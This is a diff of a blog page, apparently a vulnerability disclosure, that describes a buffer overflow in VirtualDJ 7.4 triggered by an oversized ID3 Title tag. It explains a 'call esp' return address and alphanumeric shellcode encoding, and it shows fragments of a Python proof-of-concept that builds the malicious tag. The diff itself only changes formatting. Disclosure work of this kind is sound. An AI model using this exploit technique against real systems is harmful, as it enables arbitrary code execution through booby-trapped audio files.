@@ -65,18 +65,18 @@
             <p>
                 <span 
                     class="post-key">Author</span><span
-                    class="post-val">Alexandro Sanchez</span>
+                    class="post-val">Alexandro Sanchez Bach</span>
                 <span
                     class="post-key">Date</span><span
                     class="post-val">2013-04-20</span>
             </p>
             <p>I have found a buffer overflow vulnerability in <a href="http://www.virtualdj.com/">VirtualDJ Pro 7.4 and VirtualDJ Home 7.4</a> and possibly previous versions of this software. After right-clicking a file and entering the "<em>File Infos</em>" &gt; "<em>Cover...</em>" menu, VirtualDJ tries to find a cover for the given file on Google Images and stores the request URL in a buffer which looks like: <code>"http://images.google.com/images?q=X"</code> where <code>X</code> corresponds to the ID3 tag <em>Title</em>. Special characters of this tag are ignored, and any sequence of symbols (e.g. <code>' '</code>, <code>'-'</code>, <code>'_'</code>) is replaced with <code>'+'</code>. The problem is <a href="../2013-03-30-virtualdj-73-buffer-overflow/">once again</a> that VirtualDJ does not check if the information stored in the ID3 tags is too big to fit in the buffer.</p>
 <p>To exploit this vulnerability, I searched for a <code>call esp</code> instruction stored in an address that could be represented with alphanumeric characters, I found such instruction in 0x444D4C64, that is, <code>"dLMD"</code>. After entering this call, all the bytes after the <em>Fake Title</em> + <em>Spaces</em> + <em>Padding</em> + <code>"dLMD"</code> will be executed. Since we can only use alphanumeric characters, we have to encode the shellcode and decode it in execution time using only bytes in range <code>[0-9A-Za-z]</code>. For this purpose I used a function from <a href="http://code.google.com/p/alpha3/">ALPHA3</a>. After that, the original shellcode will be decoded and executed.</p>
-<div class="codehilite"><pre><span></span><span class="c1">#Exploit: VirtualDJ Pro/Home &lt;=7.4 Buffer Overflow Vulnerability </span>
+<div class="codehilite"><pre><span></span><code><span class="c1">#Exploit: VirtualDJ Pro/Home &lt;=7.4 Buffer Overflow Vulnerability </span>
 <span class="c1">#By: Alexandro Sanchez Bach | functionmixer.blogspot.com </span>
 <span class="c1">#More info: http://www.youtube.com/watch?v=Yini294AR2Q </span>
 
-<span class="k">def</span> <span class="nf">encodeData</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">validValues</span><span class="p">):</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">encodeData</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">validValues</span><span class="p">):</span>
     <span class="k">assert</span> <span class="n">data</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;Shellcode must be NULL free&quot;</span>
     <span class="n">data</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span> <span class="c1">#End of shellcode </span>
     <span class="n">encData</span> <span class="o">=</span> <span class="n">decoder</span><span class="p">[</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
@@ -88,7 +88,7 @@
         <span class="n">encData</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">bx</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">by</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">decoder</span> <span class="o">+</span> <span class="n">encData</span>
 
-<span class="k">def</span> <span class="nf">encoder</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">validValues</span><span class="p">):</span> 
+<span class="k">def</span><span class="w"> </span><span class="nf">encoder</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">validValues</span><span class="p">):</span> 
       <span class="k">for</span> <span class="n">bx</span> <span class="ow">in</span> <span class="n">validValues</span><span class="p">:</span>
         <span class="n">imul</span> <span class="o">=</span> <span class="p">(</span><span class="n">bx</span> <span class="o">*</span> <span class="mh">0x30</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="mh">0xFF</span>
         <span class="k">for</span> <span class="n">by</span> <span class="ow">in</span> <span class="n">validValues</span><span class="p">:</span>
@@ -124,10 +124,9 @@
     <span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="s2">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span><span class="p">))</span>
 <span class="p">)</span>
 
-<span class="k">print</span> <span class="n">exploit</span>
+<span class="nb">print</span> <span class="n">exploit</span>
 <span class="c1">#Paste the generated code in the tag &#39;Title&#39; of the MP3 file.</span>
-</pre></div>
-
+</code></pre></div>
 
 <p>You can see a demo of this proof of concept at: https://www.youtube.com/watch?v=Yini294AR2Q.</p>
 <h2 id="log">Log</h2>
